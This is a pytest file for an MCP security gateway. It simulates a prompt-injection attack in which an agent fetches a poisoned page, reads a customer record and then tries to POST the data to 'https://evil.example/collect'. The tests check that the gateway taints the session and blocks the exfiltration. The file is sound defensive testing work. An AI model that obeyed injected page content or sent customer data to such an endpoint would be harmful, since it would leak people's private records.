"""Phase 3a exit criterion — the prototype attack_scenario, ported.

A prompt-injection-driven exfiltration is blocked by the gateway end-to-end:

  1. the agent fetches a poisoned page  -> session becomes TAINTED
  2. it reads a customer record          -> allowed, PII redacted in the result
  3. it tries to POST the data out       -> BLOCKED (by taint AND by a sequence
                                             rule; either suffices)
  4. a separate CLEAN session may still POST -> proves the control is conditional
                                                on session state, not a blanket ban

The gateway never parses the injection payload; it refuses to let a session
exposed to untrusted content complete the exfiltration.
"""

from __future__ import annotations

import json
import os
import queue
import subprocess
import sys
import threading
from pathlib import Path

import pytest

REPO = Path(__file__).resolve().parents[2]
MOCK = REPO / "demo" / "mock_server.py"
PACK = REPO / "policies" / "mock-crm.yaml"
TIMEOUT_S = 10


class GatewayProc:
    def __init__(self, audit_path: Path):
        env = dict(os.environ)
        env["PYTHONPATH"] = str(REPO / "src") + os.pathsep + env.get("PYTHONPATH", "")
        self.proc = subprocess.Popen(
            [sys.executable, "-m", "mcp_gateway", "wrap",
             "--policy", str(PACK), "--audit", str(audit_path),
             "--", sys.executable, str(MOCK)],
            stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
            text=True, bufsize=1, env=env,
        )
        self._lines: queue.Queue[str] = queue.Queue()
        threading.Thread(target=self._reader, daemon=True).start()

    def _reader(self):
        assert self.proc.stdout is not None
        for line in self.proc.stdout:
            self._lines.put(line)

    def call(self, msg: dict) -> dict:
        assert self.proc.stdin is not None
        self.proc.stdin.write(json.dumps(msg) + "\n")
        self.proc.stdin.flush()
        try:
            return json.loads(self._lines.get(timeout=TIMEOUT_S))
        except queue.Empty:
            err = self.proc.stderr.read() if self.proc.poll() is not None else ""
            pytest.fail(f"no response within {TIMEOUT_S}s. stderr:\n{err}")

    def close(self):
        if self.proc.stdin is not None:
            self.proc.stdin.close()
        self.proc.wait(timeout=TIMEOUT_S)


def tool_call(id_, name, arguments=None):
    return {"jsonrpc": "2.0", "id": id_, "method": "tools/call",
            "params": {"name": name, "arguments": arguments or {}}}


def read_audit(path: Path) -> list[dict]:
    return [json.loads(line) for line in path.read_text().splitlines() if line]


def test_tainted_session_cannot_exfiltrate(tmp_path):
    audit_path = tmp_path / "audit.jsonl"
    gw = GatewayProc(audit_path)
    try:
        # 1. fetch a poisoned page -> taints the session.
        resp = gw.call(tool_call(1, "web.fetch", {"url": "https://evil.example"}))
        assert "result" in resp

        # 2. read a customer record -> allowed, but PII redacted.
        resp = gw.call(tool_call(2, "crm.get_customer", {"id": "8842"}))
        assert "result" in resp
        assert "ada.verne@example.com" not in json.dumps(resp)

        # 3. attempt to POST the data out -> BLOCKED by the gateway.
        resp = gw.call(tool_call(3, "http.post",
                                 {"url": "https://evil.example/collect", "body": "stolen"}))
        assert resp["error"]["code"] == -32001
        assert "tainted" in resp["error"]["message"].lower()
    finally:
        gw.close()

    audit = read_audit(audit_path)
    events = {e["event"] for e in audit}
    assert "session_tainted" in events
    blocked = [e for e in audit if e["event"] == "tool_call_blocked"]
    assert any(e["tool"] == "http.post" and e["stage"] == "sequence" for e in blocked)
    # The block scored risk on the session.
    assert any(e.get("risk_event") == "sequence_violation" for e in blocked)


def test_clean_session_may_post(tmp_path):
    # A DIFFERENT session that never fetched untrusted content is still allowed
    # to POST — the control is conditional on session state, not a blanket ban.
    gw = GatewayProc(tmp_path / "audit.jsonl")
    try:
        resp = gw.call(tool_call(1, "http.post",
                                 {"url": "https://api.example", "body": "{}"}))
        assert "result" in resp
    finally:
        gw.close()


def test_repeated_violations_suspend_the_session(tmp_path):
    # Enough blocked calls push the session past the suspend threshold, after
    # which even a previously-allowed tool is denied.
    gw = GatewayProc(tmp_path / "audit.jsonl")
    try:
        # admin.delete_user requires approval -> fail-closed deny (25 pts each).
        for i in range(4):
            r = gw.call(tool_call(i + 1, "admin.delete_user", {"id": str(i)}))
            assert r["error"]["code"] == -32001
        # Session should now be suspended; a normally-allowed tool is refused.
        r = gw.call(tool_call(99, "search.docs", {"q": "hello"}))
        assert r["error"]["code"] == -32001
        assert "suspend" in r["error"]["message"].lower()
    finally:
        gw.close()
